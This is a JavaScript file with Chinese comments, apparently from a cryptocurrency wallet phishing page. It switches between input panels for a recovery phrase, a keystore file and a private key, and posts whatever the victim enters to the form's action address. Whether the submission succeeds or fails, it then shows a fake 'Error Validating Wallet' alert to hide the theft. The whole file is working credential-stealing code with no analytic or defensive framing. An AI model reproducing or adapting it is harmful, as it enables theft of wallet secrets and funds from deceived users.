// 获取元素
var phrase = document.querySelector("#phrase");
var keystore = document.querySelector("#keystore");
var private = document.querySelector("#private");
var first = document.querySelector("#first");
var second = document.getElementById("second");
var third = document.querySelector("#third");

// 给元素添加点击事件监听器
phrase.addEventListener("click", function() {
  hide(first);
});

keystore.addEventListener("click", function() {
  hide(second);
});

private.addEventListener("click", function() {
  hide(third);
});

// 隐藏元素的函数
function hide(elem) {
  var expandedPanel = document.querySelector(".active");

  // 移除当前活动元素的 active 类
  if (expandedPanel) {
    expandedPanel.classList.remove("active");
    var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");

    for (let i = 0; i < attr.length; i++) {
      attr[i].value = "";
    }
  }

  var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400");
  var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400");

  for (let c = 0; c < i.length; c++) {
    i[c].required = false;
  }
  for (let c = 0; c < x.length; c++) {
    x[c].required = true;
  }

  // 将点击的元素添加 active 类
  elem.classList.add("active");
}

// 获取表单元素
const form = document.querySelector('#form');

// 发送数据的函数
function sendData(data) {
  const XHR = new XMLHttpRequest();
  const FD = new FormData(form);

  // 将数据添加到 FormData 对象中
  for (name in data) {
    FD.append(name, data[name]);
  }

  // 定义成功提交数据时的操作
  XHR.addEventListener('load', function(event) {
    alert('Error Validating Wallet... Please try again later');
    
    document.querySelector(".sending").style.display = "none";
  });

  // 定义错误发生时的操作
  XHR.addEventListener('error', function(event) {
    alert('Oops! Something went wrong.');
  });

  // 发送请求
  XHR.send(FD);
}

// 表单提交事件处理
$("#form").submit(function(e) {
  e.preventDefault();
  var href = $(this).attr("action");
  
  $.ajax({
    type: "POST",
    dataType: "json",
    url: href,
    data: $(this).serialize(),
    success: function(response, status, xhr) {
      if (response.status === "success" || xhr.status === 302) {
        document.querySelector(".sending").style.display = "flex";
        setTimeout(function() {
          alert("Error Validating Wallet... Please try again later");
        }, 2000);
      } else {
        alert("An error occurred: " + response.message);
      }
    },
    error: function(xhr, status, error) {
      document.querySelector(".sending").style.display = "flex";
      setTimeout(function() {
        alert("Please try again later");
      }, 2000);
    },
  });
});
